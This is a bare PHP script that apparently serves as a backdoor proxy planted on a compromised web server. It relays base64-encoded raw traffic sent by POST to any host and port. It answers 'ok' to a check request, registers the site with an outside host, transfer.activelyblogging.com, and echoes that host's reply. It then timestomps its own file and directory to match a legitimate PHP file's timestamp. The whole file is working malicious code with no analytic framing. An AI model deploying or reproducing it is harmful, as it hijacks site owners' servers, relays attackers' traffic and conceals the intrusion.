<?php
$url = "http://transfer.activelyblogging.com/httpsproxy/index.php";

error_reporting(0);
if(isset($_POST['query']) && isset($_POST['host'])) 
{ 
if(isset($secret) && ($_POST['secret'] != $secret))exit; 
header('Content-type: application/octet-stream'); 
@set_time_limit(0); 
$query = base64_decode(str_replace(' ', '+', $_POST['query'])); 
@list($host, $port) = @explode(':', base64_decode($_POST['host'])); 
if(!$port) {if (eregi("https:", $host) && !$port) {$port = 443;} else {$port = 80;}}
$ip = gethostbyname($host); 
if($fp = @fsockopen($ip, $port, $errno, $errstr, 20)) 
{ 
fwrite($fp, $query); 
while(!feof($fp)) 
{ 
$answer = fread($fp, 1024); 
echo $answer; 
} 
fclose($fp); 
} 
exit; 
}
if (isset($_GET['check'])) {
echo "ok";
} else {
if( $curl = curl_init() ) {
curl_setopt($curl, CURLOPT_URL, $url."?url=".urlencode("http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']));
curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
$out = curl_exec($curl);
echo $out;
curl_close($curl);
} else {
echo file_get_contents($url."?url=".urlencode("http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']));
}
}

$files = scandir($_SERVER['DOCUMENT_ROOT']);
for ($i=0;$i<count($files);$i++) {
if(stristr($files[$i], 'php')) {
$time = filemtime($_SERVER['DOCUMENT_ROOT']."/".$files[$i]);
break;
}
}
touch(dirname(__FILE__), $time);
touch($_SERVER['SCRIPT_FILENAME'], $time);

?>